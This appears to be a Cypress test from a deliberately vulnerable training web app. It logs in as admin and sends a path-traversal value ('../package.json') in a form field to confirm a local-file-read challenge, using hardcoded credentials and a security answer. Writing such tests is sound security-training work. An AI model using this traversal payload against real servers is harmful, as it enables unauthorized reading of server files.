describe('/dataerasure', () => {
  beforeEach(() => {
    cy.login({ email: 'admin', password: 'admin123' })
  })

  describe('challenge "lfr"', () => {
    it('should be possible to perform local file read attack using the browser', () => {
      cy.window().then(async () => {
        const form = await fetch(`${Cypress.config('baseUrl')}/dataerasure`, { cache: 'no-cache' })
        const csrf = /name="_csrf" value="([0-9a-f]+)"/.exec(await form.text())?.[1] ?? ''
        const params = new URLSearchParams({
          _csrf: csrf,
          email: 'admin@juice-sh.op',
          securityAnswer: '@xI98PxDO+06!',
          layout: '../package.json'
        })

        const response = await fetch(`${Cypress.config('baseUrl')}/dataerasure`, {
          method: 'POST',
          cache: 'no-cache',
          headers: {
            'Content-type': 'application/x-www-form-urlencoded'
          },
          body: params.toString()
        })
        if (response.status === 200) {
          console.log('Success')
        }
      })
      cy.visit('/')
      cy.expectChallengeSolved({ challenge: 'Local File Read' })
    })
  })
})
